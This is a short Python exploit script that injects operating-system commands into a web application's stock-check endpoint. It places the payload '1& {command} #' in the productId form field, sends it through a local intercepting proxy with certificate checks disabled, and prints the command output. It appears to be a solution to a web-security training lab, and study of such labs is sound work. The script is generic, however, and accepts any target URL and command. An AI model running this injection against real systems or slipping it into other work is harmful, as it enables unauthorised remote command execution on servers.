import urllib.parse
import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def command_injection(url, command):
    injection = f'1& {command} #'
    print(injection)
    myData = {
        'productId':injection,
        'storeId':'1'
    }
    # In the URL product/stock is need in order to mimic the exact same request
    r = requests.post(url+'product/stock', data=myData, verify=False, proxies=proxies)
    if(len(r.text) > 3):
        print("(+) OS command injection was successful")
        print(f'(+) Output of the command: {r.text}')
        return True
    else:
        print("(-) OS command injection failed")
        return False


def main():
    if len(sys.argv) != 3:
        print("(+) Usage: python3 %s <url> <command>" % sys.argv[0])
        print("(+) Example: python3 %s www.example.com whoami" % sys.argv[0])
        return

    url = sys.argv[1]
    command = sys.argv[2]
    print("Injecting OS command...")
    command_injection(url, command)

if __name__ == "__main__":
    main()